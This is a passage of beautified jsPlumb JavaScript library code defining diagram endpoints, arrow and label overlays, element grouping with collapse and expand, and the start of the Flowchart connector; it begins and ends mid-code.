        b.Endpoints.AbstractEndpoint.apply(this, arguments);
        var e = d.onload
          , g = d.src || d.url
          , h = d.cssClass ? " " + d.cssClass : "";
        this._jsPlumb.img = new Image,
        this._jsPlumb.ready = !1,
        this._jsPlumb.initialized = !1,
        this._jsPlumb.deleted = !1,
        this._jsPlumb.widthToUse = d.width,
        this._jsPlumb.heightToUse = d.height,
        this._jsPlumb.endpoint = d.endpoint,
        this._jsPlumb.img.onload = function() {
            null != this._jsPlumb && (this._jsPlumb.ready = !0,
            this._jsPlumb.widthToUse = this._jsPlumb.widthToUse || this._jsPlumb.img.width,
            this._jsPlumb.heightToUse = this._jsPlumb.heightToUse || this._jsPlumb.img.height,
            e && e(this))
        }
        .bind(this),
        this._jsPlumb.endpoint.setImage = function(a, b) {
            var c = a.constructor === String ? a : a.src;
            e = b,
            this._jsPlumb.img.src = c,
            null != this.canvas && this.canvas.setAttribute("src", this._jsPlumb.img.src)
        }
        .bind(this),
        this._jsPlumb.endpoint.setImage(g, e),
        this._compute = function(a, b, c, d) {
            return this.anchorPoint = a,
            this._jsPlumb.ready ? [a[0] - this._jsPlumb.widthToUse / 2, a[1] - this._jsPlumb.heightToUse / 2, this._jsPlumb.widthToUse, this._jsPlumb.heightToUse] : [0, 0, 0, 0]
        }
        ,
        this.canvas = b.createElement("img", {
            position: "absolute",
            margin: 0,
            padding: 0,
            outline: 0
        }, this._jsPlumb.instance.endpointClass + h),
        this._jsPlumb.widthToUse && this.canvas.setAttribute("width", this._jsPlumb.widthToUse),
        this._jsPlumb.heightToUse && this.canvas.setAttribute("height", this._jsPlumb.heightToUse),
        this._jsPlumb.instance.appendElement(this.canvas),
        this.actuallyPaint = function(a, b, d) {
            if (!this._jsPlumb.deleted) {
                this._jsPlumb.initialized || (this.canvas.setAttribute("src", this._jsPlumb.img.src),
                this.appendDisplayElement(this.canvas),
                this._jsPlumb.initialized = !0);
                var e = this.anchorPoint[0] - this._jsPlumb.widthToUse / 2
                  , f = this.anchorPoint[1] - this._jsPlumb.heightToUse / 2;
                c.sizeElement(this.canvas, e, f, this._jsPlumb.widthToUse, this._jsPlumb.heightToUse)
            }
        }
        ,
        this.paint = function(b, c) {
            null != this._jsPlumb && (this._jsPlumb.ready ? this.actuallyPaint(b, c) : a.setTimeout(function() {
                this.paint(b, c)
            }
            .bind(this), 200))
        }
    }
    ,
    c.extend(b.Endpoints.Image, [f, b.Endpoints.AbstractEndpoint], {
        cleanup: function(a) {
            a && (this._jsPlumb.deleted = !0,
            this.canvas && this.canvas.parentNode.removeChild(this.canvas),
            this.canvas = null)
        }
    }),
    b.Endpoints.Blank = function(a) {
        b.Endpoints.AbstractEndpoint.apply(this, arguments);
        this.type = "Blank",
        f.apply(this, arguments),
        this._compute = function(a, b, c, d) {
            return [a[0], a[1], 10, 0]
        }
        ;
        var d = a.cssClass ? " " + a.cssClass : "";
        this.canvas = b.createElement("div", {
            display: "block",
            width: "1px",
            height: "1px",
            background: "transparent",
            position: "absolute"
        }, this._jsPlumb.instance.endpointClass + d),
        this._jsPlumb.instance.appendElement(this.canvas),
        this.paint = function(a, b) {
            c.sizeElement(this.canvas, this.x, this.y, this.w, this.h)
        }
    }
    ,
    c.extend(b.Endpoints.Blank, [b.Endpoints.AbstractEndpoint, f], {
        cleanup: function() {
            this.canvas && this.canvas.parentNode && this.canvas.parentNode.removeChild(this.canvas)
        }
    }),
    b.Endpoints.Triangle = function(a) {
        this.type = "Triangle",
        b.Endpoints.AbstractEndpoint.apply(this, arguments);
        var c = this;
        a = a || {},
        a.width = a.width || 55,
        a.height = a.height || 55,
        this.width = a.width,
        this.height = a.height,
        this._compute = function(a, b, d, e) {
            var f = d.width || c.width
              , g = d.height || c.height
              , h = a[0] - f / 2
              , i = a[1] - g / 2;
            return [h, i, f, g]
        }
    }
    ;
    var g = b.Overlays.AbstractOverlay = function(a) {
        this.visible = !0,
        this.isAppendedAtTopLevel = !0,
        this.component = a.component,
        this.loc = null == a.location ? .5 : a.location,
        this.endpointLoc = null == a.endpointLocation ? [.5, .5] : a.endpointLocation,
        this.visible = a.visible !== !1
    }
    ;
    g.prototype = {
        cleanup: function(a) {
            a && (this.component = null,
            this.canvas = null,
            this.endpointLoc = null)
        },
        reattach: function(a) {},
        setVisible: function(a) {
            this.visible = a,
            this.component.repaint()
        },
        isVisible: function() {
            return this.visible
        },
        hide: function() {
            this.setVisible(!1)
        },
        show: function() {
            this.setVisible(!0)
        },
        incrementLocation: function(a) {
            this.loc += a,
            this.component.repaint()
        },
        setLocation: function(a) {
            this.loc = a,
            this.component.repaint()
        },
        getLocation: function() {
            return this.loc
        },
        updateFrom: function() {}
    },
    b.Overlays.Arrow = function(a) {
        this.type = "Arrow",
        g.apply(this, arguments),
        this.isAppendedAtTopLevel = !1,
        a = a || {};
        var e = this;
        this.length = a.length || 20,
        this.width = a.width || 20,
        this.id = a.id;
        var f = (a.direction || 1) < 0 ? -1 : 1
          , h = a.paintStyle || {
            "stroke-width": 1
        }
          , i = a.foldback || .623;
        this.computeMaxSize = function() {
            return 1.5 * e.width
        }
        ,
        this.elementCreated = function(c, d) {
            if (this.path = c,
            a.events)
                for (var e in a.events)
                    b.on(c, e, a.events[e])
        }
        ,
        this.draw = function(a, b) {
            var e, g, j, k, l;
            if (a.pointAlongPathFrom) {
                if (c.isString(this.loc) || this.loc > 1 || this.loc < 0) {
                    var m = parseInt(this.loc, 10)
                      , n = this.loc < 0 ? 1 : 0;
                    e = a.pointAlongPathFrom(n, m, !1),
                    g = a.pointAlongPathFrom(n, m - f * this.length / 2, !1),
                    j = d.pointOnLine(e, g, this.length)
                } else if (1 === this.loc) {
                    if (e = a.pointOnPath(this.loc),
                    g = a.pointAlongPathFrom(this.loc, -this.length),
                    j = d.pointOnLine(e, g, this.length),
                    f === -1) {
                        var o = j;
                        j = e,
                        e = o
                    }
                } else if (0 === this.loc) {
                    if (j = a.pointOnPath(this.loc),
                    g = a.pointAlongPathFrom(this.loc, this.length),
                    e = d.pointOnLine(j, g, this.length),
                    f === -1) {
                        var p = j;
                        j = e,
                        e = p
                    }
                } else
                    e = a.pointAlongPathFrom(this.loc, f * this.length / 2),
                    g = a.pointOnPath(this.loc),
                    j = d.pointOnLine(e, g, this.length);
                k = d.perpendicularLineTo(e, j, this.width),
                l = d.pointOnLine(e, j, i * this.length);
                var q = {
                    hxy: e,
                    tail: k,
                    cxy: l
                }
                  , r = h.stroke || b.stroke
                  , s = h.fill || b.stroke
                  , t = h.strokeWidth || b.strokeWidth;
                return {
                    component: a,
                    d: q,
                    "stroke-width": t,
                    stroke: r,
                    fill: s,
                    minX: Math.min(e.x, k[0].x, k[1].x),
                    maxX: Math.max(e.x, k[0].x, k[1].x),
                    minY: Math.min(e.y, k[0].y, k[1].y),
                    maxY: Math.max(e.y, k[0].y, k[1].y)
                }
            }
            return {
                component: a,
                minX: 0,
                maxX: 0,
                minY: 0,
                maxY: 0
            }
        }
    }
    ,
    c.extend(b.Overlays.Arrow, g, {
        updateFrom: function(a) {
            this.length = a.length || this.length,
            this.width = a.width || this.width,
            this.direction = null != a.direction ? a.direction : this.direction,
            this.foldback = a.foldback || this.foldback
        }
    }),
    b.Overlays.PlainArrow = function(a) {
        a = a || {};
        var c = b.extend(a, {
            foldback: 1
        });
        b.Overlays.Arrow.call(this, c),
        this.type = "PlainArrow"
    }
    ,
    c.extend(b.Overlays.PlainArrow, b.Overlays.Arrow),
    b.Overlays.Diamond = function(a) {
        a = a || {};
        var c = a.length || 40
          , d = b.extend(a, {
            length: c / 2,
            foldback: 2
        });
        b.Overlays.Arrow.call(this, d),
        this.type = "Diamond"
    }
    ,
    c.extend(b.Overlays.Diamond, b.Overlays.Arrow);
    var h = function(a, b) {
        return (null == a._jsPlumb.cachedDimensions || b) && (a._jsPlumb.cachedDimensions = a.getDimensions()),
        a._jsPlumb.cachedDimensions
    }
      , i = function(a) {
        b.jsPlumbUIComponent.apply(this, arguments),
        g.apply(this, arguments);
        var d = this.fire;
        this.fire = function() {
            d.apply(this, arguments),
            this.component && this.component.fire.apply(this.component, arguments)
        }
        ,
        this.detached = !1,
        this.id = a.id,
        this._jsPlumb.div = null,
        this._jsPlumb.initialised = !1,
        this._jsPlumb.component = a.component,
        this._jsPlumb.cachedDimensions = null,
        this._jsPlumb.create = a.create,
        this._jsPlumb.initiallyInvisible = a.visible === !1,
        this.getElement = function() {
            if (null == this._jsPlumb.div) {
                var c = this._jsPlumb.div = b.getElement(this._jsPlumb.create(this._jsPlumb.component));
                c.style.position = "absolute",
                c.className = this._jsPlumb.instance.overlayClass + " " + (this.cssClass ? this.cssClass : a.cssClass ? a.cssClass : ""),
                this._jsPlumb.instance.appendElement(c),
                this._jsPlumb.instance.getId(c),
                this.canvas = c;
                var d = "translate(-50%, -50%)";
                c.style.webkitTransform = d,
                c.style.mozTransform = d,
                c.style.msTransform = d,
                c.style.oTransform = d,
                c.style.transform = d,
                c._jsPlumb = this,
                a.visible === !1 && (c.style.display = "none")
            }
            return this._jsPlumb.div
        }
        ,
        this.draw = function(a, b, d) {
            var e = h(this);
            if (null != e && 2 === e.length) {
                var f = {
                    x: 0,
                    y: 0
                };
                if (d)
                    f = {
                        x: d[0],
                        y: d[1]
                    };
                else if (a.pointOnPath) {
                    var g = this.loc
                      , i = !1;
                    (c.isString(this.loc) || this.loc < 0 || this.loc > 1) && (g = parseInt(this.loc, 10),
                    i = !0),
                    f = a.pointOnPath(g, i)
                } else {
                    var j = this.loc.constructor === Array ? this.loc : this.endpointLoc;
                    f = {
                        x: j[0] * a.w,
                        y: j[1] * a.h
                    }
                }
                var k = f.x - e[0] / 2
                  , l = f.y - e[1] / 2;
                return {
                    component: a,
                    d: {
                        minx: k,
                        miny: l,
                        td: e,
                        cxy: f
                    },
                    minX: k,
                    maxX: k + e[0],
                    minY: l,
                    maxY: l + e[1]
                }
            }
            return {
                minX: 0,
                maxX: 0,
                minY: 0,
                maxY: 0
            }
        }
    };
    c.extend(i, [b.jsPlumbUIComponent, g], {
        getDimensions: function() {
            return [1, 1]
        },
        setVisible: function(a) {
            this._jsPlumb.div && (this._jsPlumb.div.style.display = a ? "block" : "none",
            a && this._jsPlumb.initiallyInvisible && (h(this, !0),
            this.component.repaint(),
            this._jsPlumb.initiallyInvisible = !1))
        },
        clearCachedDimensions: function() {
            this._jsPlumb.cachedDimensions = null
        },
        cleanup: function(a) {
            a ? null != this._jsPlumb.div && (this._jsPlumb.div._jsPlumb = null,
            this._jsPlumb.instance.removeElement(this._jsPlumb.div)) : (this._jsPlumb && this._jsPlumb.div && this._jsPlumb.div.parentNode && this._jsPlumb.div.parentNode.removeChild(this._jsPlumb.div),
            this.detached = !0)
        },
        reattach: function(a) {
            null != this._jsPlumb.div && a.getContainer().appendChild(this._jsPlumb.div),
            this.detached = !1
        },
        computeMaxSize: function() {
            var a = h(this);
            return Math.max(a[0], a[1])
        },
        paint: function(a, b) {
            this._jsPlumb.initialised || (this.getElement(),
            a.component.appendDisplayElement(this._jsPlumb.div),
            this._jsPlumb.initialised = !0,
            this.detached && this._jsPlumb.div.parentNode.removeChild(this._jsPlumb.div)),
            this._jsPlumb.div.style.left = a.component.x + a.d.minx + "px",
            this._jsPlumb.div.style.top = a.component.y + a.d.miny + "px"
        }
    }),
    b.Overlays.Custom = function(a) {
        this.type = "Custom",
        i.apply(this, arguments)
    }
    ,
    c.extend(b.Overlays.Custom, i),
    b.Overlays.GuideLines = function() {
        var a = this;
        a.length = 50,
        a.strokeWidth = 5,
        this.type = "GuideLines",
        g.apply(this, arguments),
        b.jsPlumbUIComponent.apply(this, arguments),
        this.draw = function(b, c) {
            var e = b.pointAlongPathFrom(a.loc, a.length / 2)
              , f = b.pointOnPath(a.loc)
              , g = d.pointOnLine(e, f, a.length)
              , h = d.perpendicularLineTo(e, g, 40)
              , i = d.perpendicularLineTo(g, e, 20);
            return {
                connector: b,
                head: e,
                tail: g,
                headLine: i,
                tailLine: h,
                minX: Math.min(e.x, g.x, i[0].x, i[1].x),
                minY: Math.min(e.y, g.y, i[0].y, i[1].y),
                maxX: Math.max(e.x, g.x, i[0].x, i[1].x),
                maxY: Math.max(e.y, g.y, i[0].y, i[1].y)
            }
        }
    }
    ,
    b.Overlays.Label = function(a) {
        this.labelStyle = a.labelStyle;
        this.cssClass = null != this.labelStyle ? this.labelStyle.cssClass : null;
        var c = b.extend({
            create: function() {
                return b.createElement("div")
            }
        }, a);
        if (b.Overlays.Custom.call(this, c),
        this.type = "Label",
        this.label = a.label || "",
        this.labelText = null,
        this.labelStyle) {
            var d = this.getElement();
            if (this.labelStyle.font = this.labelStyle.font || "12px sans-serif",
            d.style.font = this.labelStyle.font,
            d.style.color = this.labelStyle.color || "black",
            this.labelStyle.fill && (d.style.background = this.labelStyle.fill),
            this.labelStyle.borderWidth > 0) {
                var e = this.labelStyle.borderStyle ? this.labelStyle.borderStyle : "black";
                d.style.border = this.labelStyle.borderWidth + "px solid " + e
            }
            this.labelStyle.padding && (d.style.padding = this.labelStyle.padding)
        }
    }
    ,
    c.extend(b.Overlays.Label, b.Overlays.Custom, {
        cleanup: function(a) {
            a && (this.div = null,
            this.label = null,
            this.labelText = null,
            this.cssClass = null,
            this.labelStyle = null)
        },
        getLabel: function() {
            return this.label
        },
        setLabel: function(a) {
            this.label = a,
            this.labelText = null,
            this.clearCachedDimensions(),
            this.update(),
            this.component.repaint()
        },
        getDimensions: function() {
            return this.update(),
            i.prototype.getDimensions.apply(this, arguments)
        },
        update: function() {
            if ("function" == typeof this.label) {
                var a = this.label(this);
                this.getElement().innerHTML = a.replace(/\r\n/g, "<br/>")
            } else
                null == this.labelText && (this.labelText = this.label,
                this.getElement().innerHTML = this.labelText.replace(/\r\n/g, "<br/>"))
        },
        updateFrom: function(a) {
            null != a.label && this.setLabel(a.label)
        }
    })
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = function(b) {
        var c = b._mottle;
        return c || (c = b._mottle = new a.Mottle),
        c
    };
    b.extend(a.jsPlumbInstance.prototype, {
        getEventManager: function() {
            return c(this)
        },
        on: function(a, b, c) {
            return this.getEventManager().on.apply(this, arguments),
            this
        },
        off: function(a, b, c) {
            return this.getEventManager().off.apply(this, arguments),
            this
        }
    })
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbUtil
      , c = a.jsPlumbInstance
      , d = "jtk-group-collapsed"
      , e = "jtk-group-expanded"
      , f = "[jtk-group-content]"
      , g = "elementDraggable"
      , h = "stop"
      , i = "revert"
      , j = "_groupManager"
      , k = "_jsPlumbGroup"
      , l = "_jsPlumbGroupDrag"
      , m = "group:addMember"
      , n = "group:removeMember"
      , o = "group:add"
      , p = "group:remove"
      , q = "group:expand"
      , r = "group:collapse"
      , s = "groupDragStop"
      , t = "connectionMoved"
      , u = "internal.connectionDetached"
      , v = "removeAll"
      , w = "orphanAll"
      , x = "show"
      , y = "hide"
      , z = function(a) {
        function c(a) {
            delete a.proxies;
            var c, d = i[a.id];
            null != d && (c = function(b) {
                return b.id === a.id
            }
            ,
            b.removeWithFunction(d.connections.source, c),
            b.removeWithFunction(d.connections.target, c),
            delete i[a.id]),
            d = j[a.id],
            null != d && (c = function(b) {
                return b.id === a.id
            }
            ,
            b.removeWithFunction(d.connections.source, c),
            b.removeWithFunction(d.connections.target, c),
            delete j[a.id])
        }
        function f(b, c) {
            for (var d = b.getMembers(), e = 0; e < d.length; e++)
                a[c ? x : y](d[e], !0)
        }
        function g(b) {
            var c = b.getMembers()
              , d = a.getConnections({
                source: c
            }, !0)
              , e = a.getConnections({
                target: c
            }, !0)
              , f = {};
            b.connections.source.length = 0,
            b.connections.target.length = 0;
            var g = function(a) {
                for (var c = 0; c < a.length; c++)
                    f[a[c].id] || (f[a[c].id] = !0,
                    a[c].source._jsPlumbGroup === b ? (a[c].target._jsPlumbGroup !== b && b.connections.source.push(a[c]),
                    i[a[c].id] = b) : a[c].target._jsPlumbGroup === b && (b.connections.target.push(a[c]),
                    j[a[c].id] = b))
            };
            g(d),
            g(e)
        }
        var h = {}
          , i = {}
          , j = {}
          , l = this;
        a.bind("connection", function(a) {
            null != a.source[k] && null != a.target[k] && a.source[k] === a.target[k] ? (i[a.connection.id] = a.source[k],
            j[a.connection.id] = a.source[k]) : (null != a.source[k] && (b.suggest(a.source[k].connections.source, a.connection),
            i[a.connection.id] = a.source[k]),
            null != a.target[k] && (b.suggest(a.target[k].connections.target, a.connection),
            j[a.connection.id] = a.target[k]))
        }),
        a.bind(u, function(a) {
            c(a.connection)
        }),
        a.bind(t, function(a) {
            var b = 0 === a.index ? i : j
              , c = b[a.connection.id];
            if (c) {
                var d = c.connections[0 === a.index ? "source" : "target"]
                  , e = d.indexOf(a.connection);
                e !== -1 && d.splice(e, 1)
            }
        }),
        this.addGroup = function(b) {
            a.addClass(b.getEl(), e),
            h[b.id] = b,
            b.manager = this,
            g(b),
            a.fire(o, {
                group: b
            })
        }
        ,
        this.addToGroup = function(b, c, d) {
            if (b = this.getGroup(b)) {
                var e = b.getEl();
                if (c._isJsPlumbGroup)
                    return;
                var f = c._jsPlumbGroup;
                if (f !== b) {
                    var g = a.getOffset(c, !0)
                      , h = b.collapsed ? a.getOffset(e, !0) : a.getOffset(b.getDragArea(), !0);
                    null != f && (f.remove(c, d),
                    l.updateConnectionsForGroup(f)),
                    b.add(c, d);
                    var i = function(a, c) {
                        var d = 0 === c ? 1 : 0;
                        a.each(function(a) {
                            a.setVisible(!1),
                            a.endpoints[d].element._jsPlumbGroup === b ? (a.endpoints[d].setVisible(!1),
                            l.expandConnection(a, d, b)) : (a.endpoints[c].setVisible(!1),
                            l.collapseConnection(a, c, b))
                        })
                    };
                    b.collapsed && (i(a.select({
                        source: c
                    }), 0),
                    i(a.select({
                        target: c
                    }), 1));
                    var j = a.getId(c);
                    a.dragManager.setParent(c, j, e, a.getId(e), g);
                    var k = {
                        left: g.left - h.left,
                        top: g.top - h.top
                    };
                    a.setPosition(c, k),
                    a.dragManager.revalidateParent(c, j, g),
                    l.updateConnectionsForGroup(b),
                    a.revalidate(j),
                    setTimeout(function() {
                        a.fire(m, {
                            group: b,
                            el: c
                        })
                    }, 0)
                }
            }
        }
        ,
        this.removeFromGroup = function(a, b, c) {
            a = this.getGroup(a),
            a && a.remove(b, null, c)
        }
        ,
        this.getGroup = function(a) {
            var c = a;
            if (b.isString(a) && (c = h[a],
            null == c))
                throw new TypeError("No such group [" + a + "]");
            return c
        }
        ,
        this.getGroups = function() {
            var a = [];
            for (var b in h)
                a.push(h[b]);
            return a
        }
        ,
        this.removeGroup = function(b, c, d, e) {
            b = this.getGroup(b),
            this.expandGroup(b, !0),
            b[c ? v : w](d, e),
            a.remove(b.getEl()),
            delete h[b.id],
            delete a._groups[b.id],
            a.fire(p, {
                group: b
            })
        }
        ,
        this.removeAllGroups = function(a, b, c) {
            for (var d in h)
                this.removeGroup(h[d], a, b, c)
        }
        ;
        var n = this.collapseConnection = function(b, c, d) {
            var e, f = d.getEl(), g = a.getId(f), h = b.endpoints[c].elementId, i = b.endpoints[0 === c ? 1 : 0].element;
            i[k] && !i[k].shouldProxy() && i[k].collapsed || (b.proxies = b.proxies || [],
            e = b.proxies[c] ? b.proxies[c].ep : a.addEndpoint(f, {
                endpoint: d.getEndpoint(b, c),
                anchor: d.getAnchor(b, c),
                parameters: {
                    isProxyEndpoint: !0
                }
            }),
            e.setDeleteOnEmpty(!0),
            b.proxies[c] = {
                ep: e,
                originalEp: b.endpoints[c]
            },
            0 === c ? a.anchorManager.sourceChanged(h, g, b, f) : (a.anchorManager.updateOtherEndpoint(b.endpoints[0].elementId, h, g, b),
            b.target = f,
            b.targetId = g),
            b.proxies[c].originalEp.detachFromConnection(b, null, !0),
            e.connections = [b],
            b.endpoints[c] = e,
            b.setVisible(!0))
        }
        ;
        this.collapseGroup = function(b) {
            if (b = this.getGroup(b),
            null != b && !b.collapsed) {
                var c = b.getEl();
                if (f(b, !1),
                b.shouldProxy()) {
                    var g = function(a, c) {
                        for (var d = 0; d < a.length; d++) {
                            var e = a[d];
                            n(e, c, b)
                        }
                    };
                    g(b.connections.source, 0),
                    g(b.connections.target, 1)
                }
                b.collapsed = !0,
                a.removeClass(c, e),
                a.addClass(c, d),
                a.revalidate(c),
                a.fire(r, {
                    group: b
                })
            }
        }
        ;
        var s = this.expandConnection = function(b, c, d) {
            if (null != b.proxies && null != b.proxies[c]) {
                var e = a.getId(d.getEl())
                  , f = b.proxies[c].originalEp.element
                  , g = b.proxies[c].originalEp.elementId;
                b.endpoints[c] = b.proxies[c].originalEp,
                0 === c ? a.anchorManager.sourceChanged(e, g, b, f) : (a.anchorManager.updateOtherEndpoint(b.endpoints[0].elementId, e, g, b),
                b.target = f,
                b.targetId = g),
                b.proxies[c].ep.detachFromConnection(b, null),
                b.proxies[c].originalEp.addConnection(b),
                delete b.proxies[c]
            }
        }
        ;
        this.expandGroup = function(b, c) {
            if (b = this.getGroup(b),
            null != b && b.collapsed) {
                var g = b.getEl();
                if (f(b, !0),
                b.shouldProxy()) {
                    var h = function(a, c) {
                        for (var d = 0; d < a.length; d++) {
                            var e = a[d];
                            s(e, c, b)
                        }
                    };
                    h(b.connections.source, 0),
                    h(b.connections.target, 1)
                }
                b.collapsed = !1,
                a.addClass(g, e),
                a.removeClass(g, d),
                a.revalidate(g),
                this.repaintGroup(b),
                c || a.fire(q, {
                    group: b
                })
            }
        }
        ,
        this.repaintGroup = function(b) {
            b = this.getGroup(b);
            for (var c = b.getMembers(), d = 0; d < c.length; d++)
                a.revalidate(c[d])
        }
        ,
        this.updateConnectionsForGroup = g,
        this.refreshAllGroups = function() {
            for (var b in h)
                g(h[b]),
                a.dragManager.updateOffsets(a.getId(h[b].getEl()))
        }
    }
      , A = function(c, d) {
        function e(a) {
            return a.offsetParent
        }
        function j(a, b) {
            var d = e(a)
              , f = c.getSize(d)
              , g = c.getSize(a)
              , h = b[0]
              , i = h + g[0]
              , j = b[1]
              , k = j + g[1];
            return i > 0 && h < f[0] && k > 0 && j < f[1]
        }
        function o(a) {
            var b = c.getId(a)
              , d = c.getOffset(a);
            a.parentNode.removeChild(a),
            c.getContainer().appendChild(a),
            c.setPosition(a, d),
            delete a._jsPlumbGroup,
            r(a),
            c.dragManager.clearParent(a, b)
        }
        function p(a) {
            if (!j(a.el, a.pos)) {
                var b = a.el._jsPlumbGroup;
                B ? c.remove(a.el) : o(a.el),
                b.remove(a.el)
            }
        }
        function q(a) {
            var b = c.getId(a);
            c.revalidate(a),
            c.dragManager.revalidateParent(a, b)
        }
        function r(a) {
            a._katavorioDrag && ((B || A) && a._katavorioDrag.off(h, p),
            B || A || !z || (a._katavorioDrag.off(i, q),
            a._katavorioDrag.setRevert(null)))
        }
        function t(a) {
            a._katavorioDrag && ((B || A) && a._katavorioDrag.on(h, p),
            y && a._katavorioDrag.setConstrain(!0),
            x && a._katavorioDrag.setUseGhostProxy(!0),
            B || A || !z || (a._katavorioDrag.on(i, q),
            a._katavorioDrag.setRevert(function(a, b) {
                return !j(a, b)
            })))
        }
        var u = this
          , v = d.el;
        this.getEl = function() {
            return v
        }
        ,
        this.id = d.id || b.uuid(),
        v._isJsPlumbGroup = !0;
        var w = this.getDragArea = function() {
            var a = c.getSelector(v, f);
            return a && a.length > 0 ? a[0] : v
        }
          , x = d.ghost === !0
          , y = x || d.constrain === !0
          , z = d.revert !== !1
          , A = d.orphan === !0
          , B = d.prune === !0
          , C = d.dropOverride === !0
          , D = d.proxied !== !1
          , E = [];
        if (this.connections = {
            source: [],
            target: [],
            internal: []
        },
        this.getAnchor = function(a, b) {
            return d.anchor || "Continuous"
        }
        ,
        this.getEndpoint = function(a, b) {
            return d.endpoint || ["Dot", {
                radius: 10
            }]
        }
        ,
        this.collapsed = !1,
        d.draggable !== !1) {
            var F = {
                stop: function(a) {
                    c.fire(s, jsPlumb.extend(a, {
                        group: u
                    }))
                },
                scope: l
            };
            d.dragOptions && a.jsPlumb.extend(F, d.dragOptions),
            c.draggable(d.el, F)
        }
        d.droppable !== !1 && c.droppable(d.el, {
            drop: function(a) {
                var b = a.drag.el;
                if (!b._isJsPlumbGroup) {
                    var d = b._jsPlumbGroup;
                    if (d !== u) {
                        if (null != d && d.overrideDrop(b, u))
                            return;
                        c.getGroupManager().addToGroup(u, b, !1)
                    }
                }
            }
        });
        var G = function(a, b) {
            for (var c = null == a.nodeType ? a : [a], d = 0; d < c.length; d++)
                b(c[d])
        };
        this.overrideDrop = function(a, b) {
            return C && (z || B || A)
        }
        ,
        this.add = function(a, b) {
            var d = w();
            G(a, function(a) {
                if (null != a._jsPlumbGroup) {
                    if (a._jsPlumbGroup === u)
                        return;
                    a._jsPlumbGroup.remove(a, !0, b, !1)
                }
                a._jsPlumbGroup = u,
                E.push(a),
                c.isAlreadyDraggable(a) && t(a),
                a.parentNode !== d && d.appendChild(a),
                b || c.fire(m, {
                    group: u,
                    el: a
                })
            }),
            c.getGroupManager().updateConnectionsForGroup(u)
        }
        ,
        this.remove = function(a, d, e, f) {
            G(a, function(a) {
                if (delete a._jsPlumbGroup,
                b.removeWithFunction(E, function(b) {
                    return b === a
                }),
                d)
                    try {
                        u.getDragArea().removeChild(a)
                    } catch (a) {
                        jsPlumbUtil.log("Could not remove element from Group " + a)
                    }
                r(a),
                e || c.fire(n, {
                    group: u,
                    el: a
                })
            }),
            f || c.getGroupManager().updateConnectionsForGroup(u)
        }
        ,
        this.removeAll = function(a, b) {
            for (var d = 0, e = E.length; d < e; d++)
                u.remove(E[0], a, b, !0);
            E.length = 0,
            c.getGroupManager().updateConnectionsForGroup(u)
        }
        ,
        this.orphanAll = function() {
            for (var a = 0; a < E.length; a++)
                o(E[a]);
            E.length = 0
        }
        ,
        this.getMembers = function() {
            return E
        }
        ,
        v[k] = this,
        c.bind(g, function(a) {
            a.el._jsPlumbGroup === this && t(a.el)
        }
        .bind(this)),
        this.shouldProxy = function() {
            return D
        }
        ,
        c.getGroupManager().addGroup(this)
    };
    c.prototype.addGroup = function(a) {
        var b = this;
        if (b._groups = b._groups || {},
        null != b._groups[a.id])
            throw new TypeError("cannot create Group [" + a.id + "]; a Group with that ID exists");
        if (null != a.el[k])
            throw new TypeError("cannot create Group [" + a.id + "]; the given element is already a Group");
        var c = new A(b,a);
        return b._groups[c.id] = c,
        a.collapsed && this.collapseGroup(c),
        c
    }
    ,
    c.prototype.addToGroup = function(a, b, c) {
        var d = function(b) {
            var d = this.getId(b);
            this.manage(d, b),
            this.getGroupManager().addToGroup(a, b, c)
        }
        .bind(this);
        if (Array.isArray(b))
            for (var e = 0; e < b.length; e++)
                d(b[e]);
        else
            d(b)
    }
    ,
    c.prototype.removeFromGroup = function(a, b, c) {
        this.getGroupManager().removeFromGroup(a, b, c)
    }
    ,
    c.prototype.removeGroup = function(a, b, c, d) {
        this.getGroupManager().removeGroup(a, b, c, d)
    }
    ,
    c.prototype.removeAllGroups = function(a, b, c) {
        this.getGroupManager().removeAllGroups(a, b, c)
    }
    ,
    c.prototype.getGroup = function(a) {
        return this.getGroupManager().getGroup(a)
    }
    ,
    c.prototype.getGroups = function() {
        return this.getGroupManager().getGroups()
    }
    ,
    c.prototype.expandGroup = function(a) {
        this.getGroupManager().expandGroup(a)
    }
    ,
    c.prototype.collapseGroup = function(a) {
        this.getGroupManager().collapseGroup(a)
    }
    ,
    c.prototype.repaintGroup = function(a) {
        this.getGroupManager().repaintGroup(a)
    }
    ,
    c.prototype.toggleGroup = function(a) {
        a = this.getGroupManager().getGroup(a),
        null != a && this.getGroupManager()[a.collapsed ? "expandGroup" : "collapseGroup"](a)
    }
    ,
    c.prototype.getGroupManager = function() {
        var a = this[j];
        return null == a && (a = this[j] = new z(this)),
        a
    }
    ,
    c.prototype.removeGroupManager = function() {
        delete this[j]
    }
    ,
    c.prototype.getGroupFor = function(a) {
        if (a = this.getElement(a))
            return a[k]
    }
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb
      , c = a.jsPlumbUtil
      , d = function(a) {
        this.type = "Flowchart",
        a = a || {},
        a.stub = null == a.stub ? 30 : a.stub;
        var c, d, e = b.Connectors.AbstractConnector.apply(this, arguments), f = null == a.midpoint ? .5 : a.midpoint, g = a.alwaysRespectStubs === !0, h = null, i = null, j = null != a.cornerRadius ? a.cornerRadius : 0, k = (a.loopbackRadius || 25,
        function(a) {
            return a < 0 ? -1 : 0 === a ? 0 : 1
        }
        ), l = function(a, b, c, d) {
            if (h !== b || i !== c) {
                var e = null == h ? d.sx : h
                  , f = null == i ? d.sy : i
                  , g = e === b ? "v" : "h"
                  , j = k(b - e)
                  , l = k(c - f);
                h = b,
                i = c,
                a.push([e, f, b, c, g, j, l])
            }
        }, m = function(a) {
            return Math.sqrt(Math.pow(a[0] - a[2], 2) + Math.pow(a[1] - a[3], 2))
        }, n = function(a) {
            var b = [];
            return b.push.apply(b, a),
            b
        }, o = function(a, b, c) {
            for (var d, f = null, g = 0; g < b.length - 1; g++) {
                if (f = f || n(b[g]),
                d = n(b[g + 1]),
                j > 0 && f[4] !== d[4]) {
                    var h = Math.min(j, m(f), m(d));
                    f[2] -= f[5] * h,
                    f[3] -= f[6] * h,
                    d[0] += d[5] * h,
                    d[1] += d[6] * h;
                    var i = f[6] === d[5] && 1 === d[5] || f[6] === d[5] && 0 === d[5] && f[5] !== d[6] || f[6] === d[5] && d[5] === -1
                      , k = d[1] > f[3] ? 1 : -1
                      , l = d[0] > f[2] ? 1 : -1
                      , o = k === l
                      , p = o && i || !o && !i ? d[0] : f[2]
